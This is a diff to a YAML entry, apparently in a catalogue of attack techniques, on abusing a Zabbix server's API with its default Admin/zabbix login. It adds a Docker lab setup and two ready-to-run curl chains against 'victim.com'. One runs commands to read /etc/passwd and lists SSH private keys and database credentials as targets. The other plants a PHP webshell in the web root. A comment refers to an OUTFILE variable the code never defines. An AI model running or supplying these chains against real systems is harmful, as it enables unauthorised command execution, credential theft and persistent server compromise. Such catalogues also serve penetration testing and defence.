@@ -12,7 +12,63 @@ comment: |
 
   Default credentials are Admin/zabbix. The API endpoint is typically at
   /zabbix/api_jsonrpc.php or /api_jsonrpc.php depending on the installation.
+docker:
+  compose: "services:\n  zabbix-server:\n    image: zabbix/zabbix-server-mysql:alpine-6.0-latest\n\
+    \    depends_on:\n      - db\n    environment:\n      DB_SERVER_HOST: db\n   \
+    \   MYSQL_DATABASE: zabbix\n      MYSQL_USER: zabbix\n      MYSQL_PASSWORD: zabbix\n\
+    \      MYSQL_ROOT_PASSWORD: root\n  zabbix-web:\n    image: zabbix/zabbix-web-nginx-mysql:alpine-6.0-latest\n\
+    \    ports:\n      - \"8080:8080\"\n    depends_on:\n      - zabbix-server\n \
+    \     - db\n    environment:\n      ZBX_SERVER_HOST: zabbix-server\n      DB_SERVER_HOST:\
+    \ db\n      MYSQL_DATABASE: zabbix\n      MYSQL_USER: zabbix\n      MYSQL_PASSWORD:\
+    \ zabbix\n      PHP_TZ: UTC\n  db:\n    image: mysql:8\n    environment:\n   \
+    \   MYSQL_ROOT_PASSWORD: root\n      MYSQL_DATABASE: zabbix\n      MYSQL_USER:\
+    \ zabbix\n      MYSQL_PASSWORD: zabbix\n"
+  note: 'Starts Zabbix 6.0 (server + web UI + MySQL). Access the web UI at `http://localhost:8080`.
+
+    Default credentials: `Admin` / `zabbix`. Run `docker compose up -d && sleep 40`
+    to allow
+
+    the server and database to fully initialise before browsing.
+
+    The API endpoint is at `http://localhost:8080/zabbix/api_jsonrpc.php`.
+
+    '
 functions:
+  file-read:
+  - code: |
+      TOKEN=$(curl -s -X POST http://victim.com/zabbix/api_jsonrpc.php \
+        -H 'Content-Type: application/json' \
+        -d '{"jsonrpc":"2.0","method":"user.login","params":{"username":"Admin","password":"zabbix"},"id":1}' \
+        | python3 -c "import sys,json; print(json.load(sys.stdin)['result'])")
+
+      HOSTID=$(curl -s -X POST http://victim.com/zabbix/api_jsonrpc.php \
+        -H 'Content-Type: application/json' \
+        -d "{\"jsonrpc\":\"2.0\",\"method\":\"host.get\",\"params\":{\"limit\":1,\"output\":[\"hostid\"]},\"auth\":\"${TOKEN}\",\"id\":2}" \
+        | python3 -c "import sys,json; print(json.load(sys.stdin)['result'][0]['hostid'])")
+
+      SCRIPTID=$(curl -s -X POST http://victim.com/zabbix/api_jsonrpc.php \
+        -H 'Content-Type: application/json' \
+        -d "{\"jsonrpc\":\"2.0\",\"method\":\"script.create\",\"params\":{\"name\":\"fr\",\"command\":\"cat /etc/passwd\",\"execute_on\":1,\"type\":0,\"scope\":2},\"auth\":\"${TOKEN}\",\"id\":3}" \
+        | python3 -c "import sys,json; print(json.load(sys.stdin)['result']['scriptids'][0])")
+
+      curl -s -X POST http://victim.com/zabbix/api_jsonrpc.php \
+        -H 'Content-Type: application/json' \
+        -d "{\"jsonrpc\":\"2.0\",\"method\":\"script.execute\",\"params\":{\"scriptid\":\"${SCRIPTID}\",\"hostid\":\"${HOSTID}\"},\"auth\":\"${TOKEN}\",\"id\":4}"
+    comment: |
+      Read arbitrary files from the Zabbix server via the script execution API.
+      The command output is returned inline under result.value in the script.execute
+      response. The script runs as the zabbix process user (commonly zabbix or root
+      in containerized deployments).
+
+      Useful files to read:
+      - /etc/zabbix/zabbix_server.conf (database credentials, encryption keys)
+      - /etc/passwd, /home/*/.ssh/id_rsa
+      - /var/lib/zabbix/.zabbix_history (command history)
+
+      Default credentials: Admin/zabbix. The API endpoint is typically at
+      /zabbix/api_jsonrpc.php or /api_jsonrpc.php.
+    contexts:
+      admin:
   rce:
   - code: |
       # Step 1: authenticate and retrieve a session token
@@ -78,4 +134,32 @@ functions:
       admin:
     listener: tcp-server
     tty: false
+  webshell:
+  - code: |
+      TOKEN=$(curl -s -X POST http://victim.com/zabbix/api_jsonrpc.php \
+        -H 'Content-Type: application/json' \
+        -d '{"jsonrpc":"2.0","method":"user.login","params":{"username":"Admin","password":"zabbix"},"id":1}' \
+        | python3 -c "import sys,json; print(json.load(sys.stdin)['result'])")
+
+      HOSTID=$(curl -s -X POST http://victim.com/zabbix/api_jsonrpc.php \
+        -H 'Content-Type: application/json' \
+        -d "{\"jsonrpc\":\"2.0\",\"method\":\"host.get\",\"params\":{\"limit\":1,\"output\":[\"hostid\"]},\"auth\":\"${TOKEN}\",\"id\":2}" \
+        | python3 -c "import sys,json; print(json.load(sys.stdin)['result'][0]['hostid'])")
+
+      SCRIPTID=$(curl -s -X POST http://victim.com/zabbix/api_jsonrpc.php \
+        -H 'Content-Type: application/json' \
+        -d "{\"jsonrpc\":\"2.0\",\"method\":\"script.create\",\"params\":{\"name\":\"ws\",\"command\":\"echo '<?php if(isset(\$_REQUEST[\\\"c\\\"])){system(\$_REQUEST[\\\"c\\\"]);} ?>' > /var/www/html/shell.php\",\"execute_on\":1,\"type\":0,\"scope\":2},\"auth\":\"${TOKEN}\",\"id\":3}" \
+        | python3 -c "import sys,json; print(json.load(sys.stdin)['result']['scriptids'][0])")
+
+      curl -s -X POST http://victim.com/zabbix/api_jsonrpc.php \
+        -H 'Content-Type: application/json' \
+        -d "{\"jsonrpc\":\"2.0\",\"method\":\"script.execute\",\"params\":{\"scriptid\":\"${SCRIPTID}\",\"hostid\":\"${HOSTID}\"},\"auth\":\"${TOKEN}\",\"id\":4}"
+    comment: "Writes a PHP webshell to the web server document root via the Zabbix\
+      \ script\nexecution API. The script runs as the zabbix process user \u2014 this\
+      \ works only if\nthe Zabbix server shares a host with a PHP-capable web server\
+      \ (common in all-in-one\ndeployments on Debian/Ubuntu: /var/www/html, or on\
+      \ CentOS: /var/www/html).\nAdjust the OUTFILE path to match the target webroot.\n\
+      Access the shell at: http://victim.com/shell.php?c=id\n"
+    contexts:
+      admin:
 ...
